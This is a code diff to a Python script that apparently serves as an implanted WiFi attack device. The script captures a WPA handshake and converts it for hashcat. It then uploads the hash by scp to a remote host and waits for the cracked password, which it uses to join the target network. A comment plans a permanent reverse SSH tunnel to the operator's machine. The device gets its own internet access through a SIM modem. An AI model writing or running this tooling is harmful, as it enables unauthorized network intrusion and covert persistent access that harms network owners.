@@ -37,7 +37,7 @@ def check_config_file():
         
         
 def check_dependencies():
-    dependencies = ['hcxpcapngtool', 'minicom']
+    dependencies = ['hcxpcapngtool', 'minicom', 'dhclient', 'wpa_passphrase', 'wpa_supplicant']
     for command in dependencies:
         output = subprocess.run(command, shell=True, capture_output=True, text=True)
         if output.returncode != 0 and output.returncode != 1:
@@ -51,6 +51,15 @@ def enable_internet():
         with open(path, 'r') as _:
             command = 'minicom -D /dev/ttyUSB2 -S minicom/init.txt'
             subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            
+            time.sleep(60)
+            
+            command = 'dhclient usb0'
+            output = subprocess.run(command, shell=True, capture_output=True, text=True)
+            if output.stderr:
+                write_log(f'[!] Error executing command "{command}"')
+                sys.exit(1)
+            
     except FileNotFoundError:
         write_log(f'[!] Script to start internet through SIM card does not exists')
         sys.exit(1)
@@ -121,16 +130,61 @@ if __name__ == '__main__':
         
     write_log(f'[+] Handshake captured')
     
+    # Stop monitor mode
+    airmon.stop(monitor_interface)
+    
     # Transform .cap file to hashcat format with hcxpcappngtool
     hashcat_format_file_name = pcap_to_hashcat_format(handshake_file_name)
     
-    '''
-    A partir de aqui tengo que:
-    1. abrir el tunel ssh inverso a mi maquina
-    2. enviar el psk.hc22000 a mi maquina
-    3. desde mi maquina, cuando crackee la password de la wifi, envio cual es la password a traves de este tunel previamente creado
-    4. cierro el tunel antiguo
-    5. me conecto a la wifi, hago dhclient -v wlan0
-    6. abro ahora otro tunel ssh nuevamente para dejarlo abierto ya para siempre
+    # Once psk.hc22000 has been stored, send via scp
+    method_to_send: dict = get_config_field("send_handshake")
+    if 'scp' in method_to_send:
+        if method_to_send['scp'].get('user') and method_to_send['scp'].get('host'):
+            user = method_to_send['scp'].get('user')
+            host = method_to_send['scp'].get('host')
+            
+            path = '/home/pgalvarez'
+            if method_to_send['scp'].get('path'):
+                path = method_to_send['scp'].get('path')
+            
+            command = f'scp psk.hc22000 {user}@{host}:{path}'
+            output = subprocess.run(command, shell=True, capture_output=True, text=True)
+            if output.stderr:
+                write_log(f'[!] Error transfering over scp psk.hc22000')
+                sys.exit(1)
+        else:
+            write_log("[!] You must specify fields 'user' and 'host' to use scp")
+            
+    cracked_password: str = None
+    while not cracked_password:
+        try:
+            with open('cracked_password.txt') as f:
+                cracked_password = f.read()
+                    
+        except FileNotFoundError:
+            time.sleep(120)  # wait for 2 minutes to check again
+            
+    # Generate wpa config file
+    command = f'wpa_passphrase {network_ssid} {cracked_password} > /etc/wpa_supplicant/{network_ssid}.conf'
+    output = subprocess.run(command, shell=True, capture_output=True, text=True)
+    if output.stderr:
+        write_log(f'[!] Error executing command "{command}"')
+        sys.exit(1)
+        
+    # Connect to wifi
+    command = f'wpa_supplicant -Dwext -iwlan0 -c/etc/wpa_supplicant/{network_ssid}.conf'
+    output = subprocess.run(command, shell=True, capture_output=True, text=True)
+    if output.stderr:
+        write_log(f'[!] Error executing command "{command}"')
+        sys.exit(1)
+        
+    # Getting an IP
+    command = f'dhclient -r; dhclient wlan0'
+    output = subprocess.run(command, shell=True, capture_output=True, text=True)
+    if output.stderr:
+        write_log(f'[!] Error executing command "{command}"')
+        sys.exit(1)
     
+    '''
+    A partir de aqui tengo que abrir el tunel ssh inverso a mi maquina y ejecutar los comandos necesarios
     '''
